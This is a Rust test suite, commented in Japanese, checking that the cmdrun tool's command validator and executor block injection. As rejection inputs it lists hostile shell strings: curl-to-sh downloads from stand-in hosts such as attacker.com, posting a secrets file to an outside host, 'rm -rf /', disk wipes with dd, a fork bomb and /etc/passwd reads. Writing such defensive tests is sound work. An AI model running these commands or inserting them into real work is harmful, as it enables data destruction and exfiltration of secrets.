//! セキュリティテスト：コマンドインジェクション対策検証
//!
//! 危険なコマンドパターンが適切にブロックされることを確認

use cmdrun::security::CommandValidator;

#[cfg(test)]
mod injection_tests {
    use super::*;

    /// 基本的なコマンドインジェクション攻撃パターン
    #[test]
    fn test_command_injection_semicolon() {
        let validator = CommandValidator::new();

        // セミコロンによるコマンド連結
        let dangerous_commands = vec![
            "ls; rm -rf /",
            "echo hello; cat /etc/passwd",
            "whoami; curl malicious.com/shell.sh | sh",
        ];

        for cmd in dangerous_commands {
            let result = validator.validate(cmd);
            assert!(!result.is_safe(), "Command should be rejected: {}", cmd);
        }
    }

    #[test]
    fn test_command_injection_pipe() {
        let validator = CommandValidator::new();

        let dangerous_commands = vec![
            "cat secret.txt | curl -X POST https://attacker.com",
            "ls -la | sh",
            "echo data | base64 | sh",
        ];

        for cmd in dangerous_commands {
            let result = validator.validate(cmd);
            assert!(!result.is_safe(), "Command should be rejected: {}", cmd);
        }
    }

    #[test]
    fn test_command_injection_substitution() {
        let validator = CommandValidator::new();

        let dangerous_commands = vec!["echo $(whoami)", "echo `cat /etc/passwd`", "ls $(ls -la /)"];

        for cmd in dangerous_commands {
            let result = validator.validate(cmd);
            assert!(
                !result.is_safe(),
                "Command substitution should be rejected: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_command_injection_redirect() {
        let validator = CommandValidator::new();

        let dangerous_commands = vec![
            "echo malicious > /etc/passwd",
            "cat /dev/zero > /dev/sda",
            "echo data >> /etc/hosts",
        ];

        for cmd in dangerous_commands {
            let result = validator.validate(cmd);
            assert!(
                !result.is_safe(),
                "Dangerous redirect should be rejected: {}",
                cmd
            );
        }
    }

    /// システム破壊コマンド
    #[test]
    fn test_dangerous_system_commands() {
        let validator = CommandValidator::new();

        let dangerous_commands = vec![
            "rm -rf /",
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda1",
            "format c:",
            ":(){:|:&};:", // フォークボム
        ];

        for cmd in dangerous_commands {
            let result = validator.validate(cmd);
            assert!(
                !result.is_safe(),
                "Dangerous system command should be rejected: {}",
                cmd
            );
        }
    }

    /// 権限昇格・システム操作
    #[test]
    fn test_privilege_escalation() {
        let validator = CommandValidator::new();

        let dangerous_commands = vec![
            "sudo rm -rf /",
            "su root",
            "chmod 777 /etc/passwd",
            "chown root:root /tmp/malicious",
        ];

        for cmd in dangerous_commands {
            let result = validator.validate(cmd);
            assert!(
                !result.is_safe(),
                "Privilege escalation command should be rejected: {}",
                cmd
            );
        }
    }

    /// 悪意のあるコード実行
    #[test]
    fn test_code_execution() {
        let validator = CommandValidator::new();

        let dangerous_commands = vec![
            "eval 'malicious code'",
            "exec sh -c 'rm -rf /'",
            "sh -c 'cat /etc/passwd'",
        ];

        for cmd in dangerous_commands {
            let result = validator.validate(cmd);
            assert!(
                !result.is_safe(),
                "Code execution command should be rejected: {}",
                cmd
            );
        }
    }

    /// ヌルバイト攻撃
    #[test]
    fn test_null_byte_injection() {
        let validator = CommandValidator::new();

        let cmd = "echo hello\0world";
        let result = validator.validate(cmd);
        assert!(!result.is_safe(), "Null byte should be rejected");
    }

    /// 長すぎるコマンド（DoS攻撃）
    #[test]
    fn test_command_length_limit() {
        let validator = CommandValidator::new().with_max_length(100);

        let long_cmd = "echo ".to_string() + &"A".repeat(200);
        let result = validator.validate(&long_cmd);
        assert!(
            !result.is_safe(),
            "Excessively long command should be rejected"
        );
    }

    /// 安全なコマンドは許可される
    #[test]
    fn test_safe_commands_allowed() {
        let validator = CommandValidator::new();

        let safe_commands = vec![
            "echo hello world",
            "ls -la",
            "cargo build",
            "npm install",
            "python script.py",
            "git status",
        ];

        for cmd in safe_commands {
            let result = validator.validate(cmd);
            assert!(result.is_safe(), "Safe command should be allowed: {}", cmd);
        }
    }

    /// 非厳格モード：パイプとリダイレクトが許可される
    #[test]
    fn test_non_strict_mode_allows_pipes() {
        let validator = CommandValidator::new()
            .with_strict_mode(false)
            .allow_pipe()
            .allow_redirect();

        let commands = vec![
            "ls -la | grep test",
            "echo hello > output.txt",
            "cat input.txt | sort | uniq",
        ];

        for cmd in commands {
            let result = validator.validate(cmd);
            assert!(
                result.is_safe(),
                "Command should be allowed in non-strict mode: {}",
                cmd
            );
        }
    }

    /// 変数展開許可モード
    #[test]
    fn test_variable_expansion_allowed() {
        let validator = CommandValidator::new()
            .allow_variable_expansion()
            .with_strict_mode(false);

        let commands = vec!["echo $HOME", "echo ${USER}", "ls ${PWD}"];

        for cmd in commands {
            let result = validator.validate(cmd);
            assert!(
                result.is_safe(),
                "Variable expansion should be allowed: {}",
                cmd
            );
        }
    }

    /// カスタム禁止ワード
    #[test]
    fn test_custom_forbidden_words() {
        let validator = CommandValidator::new()
            .add_forbidden_word("secret_command")
            .add_forbidden_word("internal_api");

        assert!(!validator.validate("run secret_command").is_safe());
        assert!(!validator.validate("call internal_api").is_safe());
        assert!(validator.validate("run normal_command").is_safe());
    }

    /// エッジケース：空コマンド
    #[test]
    fn test_empty_command() {
        let validator = CommandValidator::new();

        let empty_commands = vec!["", "   ", "\t\n"];

        for cmd in empty_commands {
            let result = validator.validate(cmd);
            assert!(!result.is_safe(), "Empty command should be rejected");
        }
    }

    /// 複合攻撃パターン
    #[test]
    fn test_complex_injection_patterns() {
        let validator = CommandValidator::new();

        let complex_attacks = vec![
            "echo 'safe' && rm -rf / #",
            "ls || curl attacker.com | sh",
            "test -f /etc/passwd && cat /etc/passwd",
            "echo hello & background_malicious_process",
        ];

        for cmd in complex_attacks {
            let result = validator.validate(cmd);
            assert!(
                !result.is_safe(),
                "Complex injection should be rejected: {}",
                cmd
            );
        }
    }
}

/// 実際のコマンド実行での統合テスト
#[cfg(test)]
mod integration_tests {
    use ahash::AHashMap;
    use cmdrun::command::executor::{CommandExecutor, ExecutionContext};
    use cmdrun::config::schema::Command;
    use cmdrun::config::CommandSpec;

    /// 危険なコマンドは実行前にブロックされる
    #[tokio::test]
    async fn test_executor_blocks_dangerous_commands() {
        let ctx = ExecutionContext {
            strict: true,
            ..Default::default()
        };
        let executor = CommandExecutor::new(ctx);

        let dangerous_cmd = Command {
            description: "dangerous".to_string(),
            cmd: CommandSpec::Single("echo hello; rm -rf /".to_string()),
            env: AHashMap::new(),
            working_dir: None,
            deps: vec![],
            platform: vec![],
            tags: vec![],
            timeout: None,
            parallel: false,
            confirm: false,
        };

        let result = executor.execute(&dangerous_cmd).await;
        assert!(result.is_err(), "Dangerous command should be blocked");
    }

    /// 非厳格モードでは一部のメタ文字が許可される
    #[tokio::test]
    async fn test_executor_non_strict_allows_pipes() {
        let ctx = ExecutionContext {
            strict: false,
            ..Default::default()
        };
        let executor = CommandExecutor::new(ctx);

        let pipe_cmd = Command {
            description: "pipe test".to_string(),
            cmd: CommandSpec::Single("echo hello | cat".to_string()),
            env: AHashMap::new(),
            working_dir: None,
            deps: vec![],
            platform: vec![],
            tags: vec![],
            timeout: None,
            parallel: false,
            confirm: false,
        };

        let result = executor.execute(&pipe_cmd).await;
        assert!(result.is_ok(), "Pipe should be allowed in non-strict mode");
    }
}
